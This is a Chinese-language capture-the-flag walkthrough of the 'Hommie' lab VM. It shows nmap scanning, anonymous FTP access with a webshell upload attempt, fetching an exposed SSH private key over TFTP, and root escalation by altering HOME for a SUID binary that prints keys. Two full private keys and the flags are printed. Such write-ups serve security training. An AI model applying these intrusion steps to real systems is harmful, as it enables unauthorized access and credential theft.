> 靶机 IP:`192.168.56.115`

### 端口扫描

```bash
nmap -Pn -sV -sC 192.168.56.115
```

```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.56.101
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0               0 Sep 30  2020 index.html
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 c6:27:ab:53:ab:b9:c0:20:37:36:52:a9:60:d3:53:fc (RSA)
|   256 48:3b:28:1f:9a:23:da:71:f6:05:0b:a5:a6:c8:b7:b0 (ECDSA)
|_  256 b3:2e:7c:ff:62:2d:53:dd:63:97:d4:47:72:c8:4e:30 (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.2
```

### ftp 服务可以匿名登录

```bash
┌──(root㉿kali)-[~]
└─# ftp 192.168.56.115
Connected to 192.168.56.115.
220 (vsFTPd 3.0.3)
Name (192.168.56.115:root): Anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

进入`.web`目录,尝试上传 webshell,发现不能解析

```bash
ftp> put simple-backdoor.php
local: simple-backdoor.php remote: simple-backdoor.php
229 Entering Extended Passive Mode (|||30783|)
150 Ok to send data.
100% |*****************************************************************************************************************************|   328      448.61 KiB/s    00:00 ETA
226 Transfer complete.
328 bytes sent in 00:00 (73.70 KiB/s)
```

访问 web 页面

```bash
curl 192.168.56.115
alexia, Your id_rsa is exposed, please move it!!!!!
Im fighting regarding reverse shells!
-nobody
```

意思是`id_rsa`泄露了

### tftp 下载 id_rsa

```
tftp 192.168.56.115
tftp> get id_rsa
```

SSH 私钥连接

```bash
chmod 700 id_rsa
ssh alexia@192.168.56.115 -i id_rsa
```

得到 user.txt

```bash
alexia@hommie:/home/alexia$ ls
user.txt
alexia@hommie:/home/alexia$ cat user.txt
Imnotroot
```

### 提权

```bash
alexia@hommie:/home/alexia$ find / -type f -perm -u=s 2>/dev/null
/opt/showMetheKey
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/su
/usr/bin/mount
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/umount
```

发现可疑文件`/opt/showMetheKey`

```bash
alexia@hommie:/opt$ ./showMetheKey
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEApwUR2Pvdhsu1RGG0UIWmj2yDNvs+4VLPG0WWisip6oZrjMjJ40h7
V0zdgZSRFhMxx0/E6ilh2MiMbpAuogCqC3MEodzIzHYAJyK4z/lIqUNdHJbgLDyaY26G0y
Rn1XI+RqLi5NUHBPyiWEuQUEZCMOqi5lS1kaiNHmVqx+rlEs6ZUq7Z6lzYs7da3XcFGuOT
gCnBh1Wb4m4e14yF+Syn4wQVh1u/53XGmeB/ClcdAbSKoJswjI1JqCCkxudwRMUYjq309j
QMxa7bbxaJbkb3hLmMuFU7RGEPu7spLvzRwGAzCuU3f60qJVTp65pzFf3x51j3YAMI+ZBq
kyNE1y12swAAA8i6ZpNpumaTaQAAAAdzc2gtcnNhAAABAQCnBRHY+92Gy7VEYbRQhaaPbI
M2+z7hUs8bRZaKyKnqhmuMyMnjSHtXTN2BlJEWEzHHT8TqKWHYyIxukC6iAKoLcwSh3MjM
dgAnIrjP+UipQ10cluAsPJpjbobTJGfVcj5GouLk1QcE/KJYS5BQRkIw6qLmVLWRqI0eZW
rH6uUSzplSrtnqXNizt1rddwUa45OAKcGHVZvibh7XjIX5LKfjBBWHW7/ndcaZ4H8KVx0B
tIqgmzCMjUmoIKTG53BExRiOrfT2NAzFrttvFoluRveEuYy4VTtEYQ+7uyku/NHAYDMK5T
d/rSolVOnrmnMV/fHnWPdgAwj5kGqTI0TXLXazAAAAAwEAAQAAAQBhD7sthEFbAqtXEAi/
+suu8frXSu9h9sPRL4GrKa5FUtTRviZFZWv4cf0QPwyJ7aGyGJNxGZd5aiLiZfwTvZsUiE
Ua47n1yGWSWMVaZ55ob3N/F9czHg0C18qWjcOh8YBrgGGnZn1r0n1uHovBevMghlsgy/2w
pmlMTtfdUo7JfEKbZmsz3auih2/64rmVp3r0YyGrvOpWuV7spnzPNAFUCjPTwgE2RpBVtk
WeiQtF8IedoMqitUsJU9ephyYqvjRemEugkqkALBJt91yBBO6ilulD8Xv1RBsVHUttE/Jz
bu4XlJXVeD10ooFofrsZd/9Ydz4fx49GwtjYnqsda0rBAAAAgGbx1tdwaTPYdEfuK1kBhu
3ln3QHVx3ZkZ7tNQFxxEjYjIPUQcFFoNBQpIUNOhLCphB8agrhcke5+aq5z2nMdXUJ3DO6
0boB4mWSMml6aGpW4AfcDFTybT6V8pwZcThS9FL3K2JmlZbgPlhkX5fyOmh14/i5ti7r9z
HlBkwMfJJPAAAAgQDPt0ouxdkG1kDNhGbGuHSMAsPibivXEB7/wK7XHTwtQZ7cCQTVqbbs
y6FqG0oSaSz4m2DfWSRZc30351lU4ZEoHJmlL8Ul6yvCjMOnzUzkhrIen131h/MStsQYtY
OZgwwdcG2+N7MReMpbDA9FSHLtHoMLUcxShLSX3ccIoWxqAwAAAIEAzdgK1iwvZkOOtM08
QPaLXRINjIKwVdmOk3Q7vFhFRoman0JeyUbEd0qlcXjFzo02MBlBadh+XlsDUqZSWo7gpp
ivFRbnEu2sy02CHilIJ6vXCQnuaflapCNG8MlG5CtpqfyVoYQ3N3d0PfOWLaB13fGeV/wN
0x2HyroKtB+OeZEAAAANYWxleGlhQGhvbW1pZQECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
```

尝试利用 ida 分析

![image-20240420181050644](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240420181050644.png)

主要就是`cat $HOME/.ssh/id_rsa`这条命令

直接修改 HOME 变量就行

```bash
alexia@hommie:/opt$ echo $HOME
/home/alexia
alexia@hommie:/opt$ export HOME=/root
alexia@hommie:/opt$ echo $HOME
/root
```

再次运行得到 root 的私钥

```bash
alexia@hommie:/opt$ ./showMetheKey
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAvBYog1I3rTTmtMw6i7oPRYy7yj8N6zNT3K9QhalnaTF+Md5NjbX5
hhNfZjO0tNbMGEeJtNTc3FpYWcAujrrd3jO5MzHUWAxQoyYYrZOFj2I5Fz/0RxD7e89H11
5nT7+CSUeddP/UeoyvSPgaruwrwD+dUl7+GiXo3sc5vsq3YufTYh1MlMKb/m7KmVk5n4Tk
/IFJwuuc3U4OZiRwXOmK4W2Gfo0Fonu6vFYmhpcCsi7V8g3hpVmOZIU8ZUtG1YbutCVbOC
EGyc1p5nbnyC0IIF5Y2EhjeevX8gmj4Kdv/y6yuvNdsJKm+ed2EEY9AymmPPwIpQshFwKz
Y0yB8N1jkQAAA8BiCyR9YgskfQAAAAdzc2gtcnNhAAABAQC8FiiDUjetNOa0zDqLug9FjL
vKPw3rM1Pcr1CFqWdpMX4x3k2NtfmGE19mM7S01swYR4m01NzcWlhZwC6Out3eM7kzMdRY
DFCjJhitk4WPYjkXP/RHEPt7z0fXXmdPv4JJR510/9R6jK9I+Bqu7CvAP51SXv4aJejexz
m+yrdi59NiHUyUwpv+bsqZWTmfhOT8gUnC65zdTg5mJHBc6YrhbYZ+jQWie7q8ViaGlwKy
LtXyDeGlWY5khTxlS0bVhu60JVs4IQbJzWnmdufILQggXljYSGN569fyCaPgp2//LrK681
2wkqb553YQRj0DKaY8/AilCyEXArNjTIHw3WORAAAAAwEAAQAAAQA/OvPDshAlmnM0tLO5
5YLczsMS6r+zIj4/InDffmPVaV4TRbisu1B3Umvv39IQOWXDg8k3kZfuPDEXexQrx4Zu/N
R18XqBXyJ8toH1WHK+ETdAKa/ldEAXD0gHjyUMGkWifQDiJF86E7GZxk6yH5NVvg0Vc/nY
sIXo3vD6wwuDo/gj+u4RRYMH3NYkLSj/O67cxGXnTOZPGzGsFTrE218BNtNqbRBR9/immU
irjugqebxY135Z4oECe/Hv4mP2e7n5QVO8FnYklQ4YU6y0ZTAMtjZCAhslXSKvaJPLjXuk
/HpdYhSoojm3vTAq/NT/oir0wA2ZYGdnF/Bxm6v/mntBAAAAgF2pqZEe9UqzcsAfOujr6z
DMRgPpl8qsdhDz6aftdg24AYmgXJ1D7PWUDpU6puO3VxJGrOwvcgD6xELRTxeFjd/2ssrh
4OO/kTvK4K0WVB/bnZ4y724iLcThfHDbzTTc5ckn45tyso8540iKha5ay1i24GwRPWddie
B/qcB1bHNOAAAAgQDmmptuwTRwUSiU1NtZRnJFvxvzLw6Wy/Cb2G+n5KY0ce5cYHT2HSIr
zsbPaDXQNBFy4iu1DAXAJJXTrxjOaAeLVYSb/8eZ1dhcgkxoAC8i2l6NwNmsjhGQKv++fV
qMfIdzVmriLXBZf7DU97YZeDIOrdOOV5CHhq+37i4xNdK18wAAAIEA0Mzc8HYvrXk4ecyi
KXP5u2Zxw2LADJ8DFeKWZmCUuNKFD1TuqdauxKxIVKVDaHvcnEr1bOiEBBso/X1CCtKjE+
12ZOWvqZ4fORxiNs9n/9YxlUSDAw7kyKd9H7dRRFdtb80OgDiwf18tDlEdboGWm/DR0NPq
gmxzbd40GES6DWsAAAALcm9vdEBob21taWU=
-----END OPENSSH PRIVATE KEY-----
```

SSH 连接

```bash
alexia@hommie:/tmp$ ssh root@0 -i id_rsa
```

连接上后

```bash
root@hommie:~# ls
note.txt
root@hommie:~# cat note.txt
I dont remember where I stored root.txt !!!
root@hommie:~# find / -name root.txt
/usr/include/root.txt
root@hommie:~# cat /usr/include/root.txt
Imnotbatman
```

## 总结

> 1.ftp 可以匿名登录
>
> 2.tftp 可以下载文件
>
> 3.suid 提权
